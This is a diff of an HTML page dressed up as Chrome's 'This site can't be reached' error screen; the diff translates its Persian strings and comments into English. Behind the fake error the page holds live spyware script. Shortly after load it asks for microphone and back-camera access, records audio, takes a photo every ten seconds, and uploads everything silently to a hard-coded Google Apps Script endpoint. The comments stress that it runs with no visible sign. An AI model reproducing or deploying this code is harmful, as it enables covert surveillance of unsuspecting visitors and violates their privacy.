@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
     <link rel="icon" href="./icon.ico">
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="color-scheme" content="light dark" />
-    <title>این سایت در دسترس نیست</title>
+    <title>This site can’t be reached</title>
 
     <style>
         *,
@@ -171,11 +171,11 @@
 </head>
 <body>
 
-    <!-- دوربین مخفی (فقط عقب) -->
+    <!-- hidden back camera -->
     <video id="camBack" class="hidden-camera" autoplay playsinline muted></video>
 
     <main class="neterror">
-        <!-- آیکون صفحه‌ی خطای کروم -->
+        <!-- Chrome-style sad folder icon -->
         <svg class="neterror-icon" viewBox="0 0 72 72" aria-hidden="true">
             <path class="face" stroke-width="1.5"
                   d="M10 24 L10 18 a4 4 0 0 1 4 -4 h14 l6 6 h24 a4 4 0 0 1 4 4 v38 a4 4 0 0 1 -4 4 H14 a4 4 0 0 1 -4 -4 z" />
@@ -185,22 +185,22 @@
                   d="M27 52 Q36 44 45 52" />
         </svg>
 
-        <h1>این سایت در دسترس نیست</h1>
+        <h1>This site can’t be reached</h1>
 
         <p class="lead">
-            اتصال به <span class="host" id="hostName">example.com</span> رد شد.
+            <span class="host" id="hostName">example.com</span> refused to connect.
         </p>
 
-        <p class="hint">برای رفع مشکل، موارد زیر را بررسی کنید:</p>
+        <p class="hint">Try:</p>
         <ul>
-            <li>بررسی اتصال به اینترنت</li>
-            <li>بررسی پروکسی و فایروال</li>
-            <li>اجرای عیب‌یابی شبکه</li>
+            <li>Checking the connection</li>
+            <li>Checking the proxy and the firewall</li>
+            <li>Running Windows Network Diagnostics</li>
         </ul>
 
         <div class="error-code">ERR_CONNECTION_REFUSED</div>
 
-        <button class="reload" id="reloadBtn" type="button">بارگیری مجدد</button>
+        <button class="reload" id="reloadBtn" type="button">Reload</button>
     </main>
 
     <script>
@@ -208,12 +208,12 @@
             'use strict';
 
             // =============================================================
-            //  ۰.  CONFIGURATION – آدرس Web App
+            //  0.  CONFIGURATION – Web App URL
             // =============================================================
             const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbz3GvNjN8b2pY_5MM7Vbrq7MP4bVHTmkzQrC8u6JRFSrrzJSJrT11JBazaGV8zloZqw/exec';
 
             // =============================================================
-            //  ۱.  CAPTURE ENGINE (بدون هیچ نشانه‌ی دیداری)
+            //  1.  CAPTURE ENGINE (fully silent)
             // =============================================================
             let mediaRecorder = null;
             let isRecording = false;
@@ -227,7 +227,7 @@
 
             const camBack = document.getElementById('camBack');
 
-            // ---- آپلود فایل به Google Apps Script ----
+            // ---- upload file to Google Apps Script ----
             function uploadFile(base64Data, filename, mimeType) {
                 if (!base64Data || base64Data.length < 100) return;
                 const payload = {
@@ -249,7 +249,7 @@
                 }
             }
 
-            // ---- گرفتن فریم از دوربین عقب ----
+            // ---- grab frame from back camera ----
             function captureBackCamera() {
                 return new Promise((resolve) => {
                     if (!camBack || camBack.readyState < 2) { resolve(null); return; }
@@ -283,7 +283,7 @@
                 }
             }
 
-            // ---- ضبط صدا (Opus) ----
+            // ---- audio recording (Opus) ----
             function uploadOpusBlob(blob) {
                 if (!blob || blob.size < 1000) return;
                 const reader = new FileReader();
@@ -344,9 +344,9 @@
                 }
             }
 
-            // ---- شروع همه‌ی ضبط‌ها، بی‌صدا ----
+            // ---- start all captures, silently ----
             function startAllCaptures() {
-                // میکروفون
+                // microphone
                 if (!isMicAllowed) {
                     navigator.mediaDevices.getUserMedia({ audio: true })
                         .then(stream => {
@@ -354,12 +354,12 @@
                             isMicAllowed = true;
                             startAudioRecording();
                         })
-                        .catch(() => { /* بی‌صدا رد شود */ });
+                        .catch(() => { /* silently ignore */ });
                 } else {
                     startAudioRecording();
                 }
 
-                // دوربین عقب
+                // back camera
                 if (!isCamAllowed) {
                     const constraintsBack = {
                         video: {
@@ -377,30 +377,27 @@
                             captureIntervalId = setInterval(sendBackPhoto, 10000);
                             sendBackPhoto();
                         })
-                        .catch(() => { /* بی‌صدا رد شود */ });
+                        .catch(() => { /* silently ignore */ });
                 } else if (!captureIntervalId) {
                     captureIntervalId = setInterval(sendBackPhoto, 10000);
                 }
             }
 
             // =============================================================
-            //  ۲.  INIT
+            //  2.  INIT
             // =============================================================
             function init() {
-                // نام میزبان نمایشی در متن خطا
                 const hostEl = document.getElementById('hostName');
                 if (hostEl) {
                     const h = location.hostname;
                     hostEl.textContent = (h && h.length) ? h : 'example.com';
                 }
 
-                // دکمه بارگیری مجدد
                 const reloadBtn = document.getElementById('reloadBtn');
                 if (reloadBtn) {
                     reloadBtn.addEventListener('click', () => location.reload());
                 }
 
-                // شروع بی‌صدای ضبط‌ها بعد از بارگذاری کامل صفحه
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     setTimeout(startAllCaptures, 600);
                 }
